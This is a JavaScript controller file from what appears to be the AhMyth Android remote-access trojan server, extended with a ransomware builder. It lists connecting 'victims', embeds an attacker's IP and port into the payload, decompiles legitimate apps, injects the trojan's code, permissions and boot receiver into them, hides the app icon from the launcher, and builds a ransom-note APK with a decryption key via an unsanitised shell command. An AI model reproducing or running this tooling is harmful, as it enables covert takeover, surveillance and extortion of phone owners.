var app = angular.module('myapp', []);
const { remote } = require('electron');
var dialog = remote.dialog;
const { ipcRenderer } = require('electron');
var fs = require('fs-extra')
var victimsList = remote.require('./main');
const CONSTANTS = require(__dirname + '/assets/js/Constants')
var homeDir = require('homedir');
var path = require("path");
var exec = require('child_process').exec, child;

//--------------------------------------------------------------
var viclist = {};
var dataPath = path.join(homeDir(), CONSTANTS.dataDir);
var downloadsPath = path.join(dataPath, CONSTANTS.downloadPath);
var outputPath = path.join(dataPath, CONSTANTS.outputApkPath);
//--------------------------------------------------------------



// App Controller for (index.html)
app.controller("AppCtrl", ($scope) => {
    $appCtrl = $scope;
    $appCtrl.victims = viclist;
    $appCtrl.isVictimSelected = true;
    $appCtrl.bindApk = { enable: false, method: 'BOOT' }; //default values for binding apk
    var log = document.getElementById("log");
    $appCtrl.logs = [];
    $('.menu .item')
        .tab();
    $('.ui.dropdown')
        .dropdown();

    const window = remote.getCurrentWindow();
    $appCtrl.close = () => {
        window.close();
    };

    $appCtrl.minimize = () => {
        window.minimize();
    };

    // when user clicks Listen button
    $appCtrl.Listen = (port) => {
        if (!port) {
            port = CONSTANTS.defaultPort;
        }

        // notify the main proccess about the port and let him start listening
        ipcRenderer.send("SocketIO:Listen", port);
        $appCtrl.Log("Listening on port => " + port, CONSTANTS.logStatus.SUCCESS);
    }


    // fired when main peoccess (main.js) send any new notification about new victim
    ipcRenderer.on('SocketIO:NewVictim', (event, index) => {
        // add the new victim to the list
        viclist[index] = victimsList.getVictim(index);
        $appCtrl.Log("New victim from " + viclist[index].ip);
        $appCtrl.$apply();
    });


    // fired if listening brings error
    ipcRenderer.on("SocketIO:Listen", (event, error) => {
        $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
        $appCtrl.isListen = false;
        $appCtrl.$apply()
    });


    // fired when main peoccess (main.js) send any new notification about disconnected victim
    ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
        $appCtrl.Log("Victim disconnected " + viclist[index].ip);
        // delete him from list
        delete viclist[index];
        $appCtrl.$apply();
    });


    // notify the main proccess (main.js) to open the lab
    $appCtrl.openLab = (index) => {
        ipcRenderer.send('openLabWindow', 'lab.html', index);
    }


    // app logs to print any new log in the black terminal
    $appCtrl.Log = (msg, status) => {
        var fontColor = CONSTANTS.logColors.DEFAULT;
        if (status == CONSTANTS.logStatus.SUCCESS)
            fontColor = CONSTANTS.logColors.GREEN;
        else if (status == CONSTANTS.logStatus.FAIL)
            fontColor = CONSTANTS.logColors.RED;

        $appCtrl.logs.push({ date: new Date().toLocaleString(), msg: msg, color: fontColor });
        log.scrollTop = log.scrollHeight;
        if (!$appCtrl.$$phase)
            $appCtrl.$apply();
    }



    // function to open the dialog and choose apk to be bindded
    $appCtrl.BrowseApk = () => {
        dialog.showOpenDialog({}, {

            properties: ['openFile']
        }).then(result => {

            if(result.canceled) {

                $appCtrl.Log("No file selected");
            } else {

                $appCtrl.Log("File choosen  " + result.filePaths[0]);
                readFile(result.filePaths[0]);
            }
        }).catch(() => {
            $appCtrl.Log("No file selected");
        })

        function readFile(filepath) {
            $appCtrl.filePath = filepath;
            $appCtrl.$apply();
        }
    }

    // function to run python file

        $appCtrl.callpy = () => {
          $appCtrl.Log('Getting Icon from path input ', '..');
          var iconransome = document.getElementById('icon').value
          $appCtrl.Log('Applying APK name from input ', '..');
          var nameransome = document.getElementById('name').value
          $appCtrl.Log('Applying APK title from input ', '..');
          var titleransome = document.getElementById('title').value
          $appCtrl.Log('Inserting Ransomware title from input ', '..');
          var descransome = document.getElementById('desc').value
          $appCtrl.Log('Inserting Ransomware description from input ', '..');
          var keyransome = document.getElementById('key').value
          $appCtrl.Log('Building Ransomware APK ', '..');
          var createRansom = exec("cd SARA && python3 sara.py "+iconransome+" "+nameransome+" "+titleransome+" "+descransome+" "+keyransome,
            function (error, stdout, stderr) {
               // console.log('stdout: ' + stdout);
               // console.log('stderr: ' + stderr);
                if (error !== null) {
                    if (iconransome.length == 0){
                        $appCtrl.Log('Please input the path to the PNG to be used', CONSTANTS.logStatus.FAIL);
                        }
                    if (nameransome.length == 0){
                        $appCtrl.Log('Please input the name of the APK to be used', CONSTANTS.logStatus.FAIL);
                        }
                    if (titleransome.length == 0){
                        $appCtrl.Log('Please Input an Encryption Message Title', CONSTANTS.logStatus.FAIL);
                        }
                    if (descransome.length == 0){
                        $appCtrl.Log('Please type out the Encryption Message', CONSTANTS.logStatus.FAIL);
                        }
                    if (keyransome.length == 0){
                        $appCtrl.Log('Please Input a Decryption Key', CONSTANTS.logStatus.FAIL);
                        }
                        $appCtrl.Log('Ransomware Build Failed', CONSTANTS.logStatus.FAIL);
                        return;
                        
                    }
                    
                    if (err) throw err, 
                    $appCtrl.Log('Ransomware Built Successfully ', CONSTANTS.logStatus.SUCCESS);
                    $appCtrl.Log('The APK has been built on ' + 'AhMyth/AhMyth-Server/SARA/', CONSTANTS.logStatus.SUCCESS);
                });
            }





    // function to build the apk and sign it
    $appCtrl.GenerateApk = (apkFolder) => {

        $appCtrl.Log('Building ' + CONSTANTS.apkName + '...');
        var createApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + path.join(outputPath, CONSTANTS.apkName) + '"',
            (error, stdout, stderr) => {
                if (error !== null) {
                    $appCtrl.Log('Building Failed', CONSTANTS.logStatus.FAIL);
                    return;
                }

                $appCtrl.Log('Signing ' + CONSTANTS.apkName + '...');
                var signApk = exec('java -jar "' + CONSTANTS.signApkJar + '" -a "' + path.join(outputPath, CONSTANTS.apkName) + '"',
                    (error, stdout, stderr) => {
                        if (error !== null) {
                            $appCtrl.Log('Signing Failed', CONSTANTS.logStatus.FAIL);
                            return;
                        }


                        fs.unlink(path.join(outputPath, CONSTANTS.apkName), (err) => {
                            if (err) throw err;

                            $appCtrl.Log('Apk built successfully', CONSTANTS.logStatus.SUCCESS);
                            $appCtrl.Log("The apk has been built on " + path.join(outputPath), CONSTANTS.logStatus.SUCCESS);

                        });
                    });
            });

    }


    // function to copy ahmyth source files to the orginal app
    // and if success go to generate the apk
    $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {

        $appCtrl.Log("Copying Ahmyth files to orginal app...");
        fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, "smali"), (error) => {
            if (error) {
                $appCtrl.Log('Copying Failed', CONSTANTS.logStatus.FAIL);
                return;
            }

            $appCtrl.GenerateApk(apkFolder);
        })

    };


    // fuction to copy all the ahmyth permissions to the orginal app
    $appCtrl.copyPermissions = (manifest) => {
        var firstPart = manifest.substring(0, manifest.indexOf("<application"));
        var lastPart = manifest.substring(manifest.indexOf("<application"));

        var permArray = CONSTANTS.permissions;
        for (var i = 0; i < permArray.length; i++) {
            var permissionName = permArray[i].substring(permArray[i].indexOf('name="') + 6);
            permissionName = permissionName.substring(0, permissionName.indexOf('"'));
            if (firstPart.indexOf(permissionName) == -1) {
                firstPart = firstPart + "\n" + permArray[i];
            }
        }

        return (firstPart + lastPart);

    };


    // function to use onBoot method 
    // it will bind ahmyth to orginal app 
    // and ahmyth will start once the device rebooted
    // if success then go to copy all the rest ahmyth files to orginal app
    // this method is working almost on every app 
    $appCtrl.BindOnBoot = (apkFolder) => {
        fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
            if (error) {
                $appCtrl.Log('Reading AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                return;
            }

            var ahmythService = CONSTANTS.ahmythService;
            var ahmythReciver = CONSTANTS.ahmythReciver;
            $appCtrl.Log('Modifying AndroidManifest.xml...');
            var permManifest = $appCtrl.copyPermissions(data);
            var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + ahmythReciver + permManifest.substring(permManifest.indexOf("</application>"));
            fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
                if (error) {
                    $appCtrl.Log('Modifying AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                    return;
                }
                $appCtrl.CopyAhmythFilesAndGenerateApk(apkFolder);

            });

        });

    };



    // function to use OnLauncher method 
    // it will bind ahmyth to orginal app 
    // and ahmyth will start once the orginal app started
    // if success then go to copy all the rest ahmyth files to orginal app
    // this method is not working on every app (unstable)
    $appCtrl.BindOnLauncher = (apkFolder) => {

        $appCtrl.Log('Finding launcher activity from AndroidManifest.xml...');
        fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
            if (error) {
                $appCtrl.Log('Reading AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                return;
            }

            var launcherPath = GetLauncherPath(data, path.join(apkFolder, "smali/"));
            if (launcherPath == -1) {
                $appCtrl.Log("Cannot find the launcher activity , try the other binding method.", CONSTANTS.logStatus.FAIL);
                return;
            }

            var ahmythService = CONSTANTS.ahmythService;
            $appCtrl.Log('Modifying AndroidManifest.xml...');
            var permManifest = $appCtrl.copyPermissions(data);
            var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + permManifest.substring(permManifest.indexOf("</application>"));
            fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
                if (error) {
                    $appCtrl.Log('Modifying AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                    return;
                }

                //hide payload by editing AndroidManifest.xml
            fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (err,data) => {
                var formatted = data.replace(/android.intent.category.LAUNCHER/g, 'android.intent.category.INFO');
            fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), formatted, 'utf8', (err) => {
                if (err) {
                    $appCtrl.Log('Hiding in AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                    return;
                }
                })
        })
                $appCtrl.Log("Fetching launcher activity...");
                fs.readFile(launcherPath, 'utf8', (error, data) => {
                    if (error) {
                        $appCtrl.Log('Reading launcher activity Failed ', CONSTANTS.logStatus.FAIL);
                        return;
                    }


                    var startService = CONSTANTS.serviceSrc + launcherPath.substring(launcherPath.indexOf("smali/") + 6, launcherPath.indexOf(".smali")) + CONSTANTS.serviceStart;


                    var key = CONSTANTS.orgAppKey;
                    $appCtrl.Log("Modifiying launcher activity...");
                    var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
                    fs.writeFile(launcherPath, output, 'utf8', (error) => {
                        if (error) {
                            $appCtrl.Log('Modifying launcher activity Failed', logStatus.FAIL);
                            return;
                        }

                        $appCtrl.CopyAhmythFilesAndGenerateApk(apkFolder);

                    });


                });
            });

        });

    }

    // fired when user click build buttom
    // collect the ip and port and start building
    $appCtrl.Build = (ip, port) => {
        if (!ip) {
            $appCtrl.Log('IP Address Cannot Be Empty.', CONSTANTS.logStatus.FAIL);
            return;
        } else if (!port) {
            port = CONSTANTS.defaultPort;
        } else if (port > 65535 || port <= 1024) {
            $appCtrl.Log('Choose ports from range (1024,65535)', CONSTANTS.logStatus.FAIL);
            return;
        }


        // open ahmyth source file and modifiy the ip and port to the users' ones
        var ipPortFile = path.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
        $appCtrl.Log('Reading (ip:port) file from ' + CONSTANTS.apkName + '...');
        fs.readFile(ipPortFile, 'utf8', (error, data) => {
            if (error) {
                $appCtrl.Log('Reading (ip:port) file Failed', CONSTANTS.logStatus.FAIL);
                return;
            }

            $appCtrl.Log('Adding source ip:port to ' + CONSTANTS.apkName + '...');
            $appCtrl.Log('Adding source ip:port to ' + ipPortFile + '...');
            var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + ip + ":" + port);
            fs.writeFile(ipPortFile, result, 'utf8', (error) => {
                if (error) {
                    $appCtrl.Log('Adding source ip:port Failed', CONSTANTS.logStatus.FAIL);
                    return;
                }

                // check if bind apk is enabled
                if (!$appCtrl.bindApk.enable) {
                    $appCtrl.GenerateApk(CONSTANTS.ahmythApkFolderPath);

                } else {
                    // generate a solid ahmyth apk
                    var filePath = $appCtrl.filePath;
                    if (filePath == null) {
                        $appCtrl.Log("Browse an apk file which you want to bind", CONSTANTS.logStatus.FAIL);
                        return;
                    } else if (!filePath.includes(".apk")) {
                        $appCtrl.Log("It is not an apk file", CONSTANTS.logStatus.FAIL);
                        return;
                    }


                    var apkFolder = filePath.substring(0, filePath.indexOf(".apk"));
                    $appCtrl.Log('Decompiling ' + filePath + "...");
                    var decompileApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"',
                        (error, stdout, stderr) => {
                            if (error !== null) {
                                $appCtrl.Log('Decompilation Failed', CONSTANTS.logStatus.FAIL);
                                return;
                            }

                            if ($appCtrl.bindApk.method == 'BOOT')
                                $appCtrl.BindOnBoot(apkFolder);

                            else if ($appCtrl.bindApk.method == 'ACTIVITY')
                                $appCtrl.BindOnLauncher(apkFolder);


                        });
                }
            });
        });
    }










});



//function to extract the launcher activity from the orginal app
function GetLauncherPath(manifest, smaliPath) {


    var regex = /<activity/gi,
        result, indices = [];
    while ((result = regex.exec(manifest))) {
        indices.push(result.index);
    }

    var indexOfLauncher = manifest.indexOf("android.intent.category.LAUNCHER");
    var indexOfActivity = -1;

    if (indexOfLauncher != -1) {
        manifest = manifest.substring(0, indexOfLauncher);
        for (var i = indices.length - 1; i >= 0; i--) {
            if (indices[i] < indexOfLauncher) {
                indexOfActivity = indices[i];
                manifest = manifest.substring(indexOfActivity, manifest.length);
                break;
            }
        }


        if (indexOfActivity != -1) {

            if (manifest.indexOf('android:targetActivity="') != -1) {
                manifest = manifest.substring(manifest.indexOf('android:targetActivity="') + 24);
                manifest = manifest.substring(1, manifest.indexOf('"'))
                manifest += '.smali';
                var files = fs.walkSync(smaliPath);
                for (var i = 0; i < files.length; i++) {
                    if (files[i].substring(files[i].lastIndexOf("/") + 1) == manifest)
                        return files[i];
                }

            } else {
                manifest = manifest.substring(manifest.indexOf('android:name="') + 14);
                manifest = manifest.substring(0, manifest.indexOf('"'))
                manifest = manifest.replace(/\./g, "/");
                manifest = path.join(smaliPath, manifest) + ".smali"
                return manifest;
            }

        }
    }
    return -1;



}
